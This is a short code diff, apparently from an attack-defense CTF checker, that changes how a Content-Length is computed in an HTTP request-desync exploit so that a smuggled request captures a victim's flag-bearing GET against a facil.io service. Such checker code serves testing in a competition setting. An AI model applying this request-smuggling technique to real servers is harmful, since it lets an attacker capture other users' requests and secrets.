@@ -332,15 +332,12 @@ async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> st
     assert len(refresh_hash) == len(task.attack_info)
 
     netloc = base_url.netloc.decode()
-    cl = (
-        101  # extra headers
-        + 173  # next request w/o flag & path
-        + 24  # path
-        + {
-            "ENO[A-Za-z0-9+\\/=]{48}": 48 + 3,
-            "🥺[A-Za-z0-9+\\/=]{48}🥺🥺": 48 + 3 * 4,
-        }[task.flag_regex]
-    )
+    flag_len = {
+        "ENO[A-Za-z0-9+\\/=]{48}": 48 + 3,
+        "🥺[A-Za-z0-9+\\/=]{48}🥺🥺": 48 + 3 * 4,
+    }[task.flag_regex]
+    # facil.io trailing (101) + victim GET (158 + netloc + path 24 + flag)
+    cl = 283 + len(netloc) + flag_len
     dump = f"/{letter_noise(128)}"
     await verify_netloc(
         client,
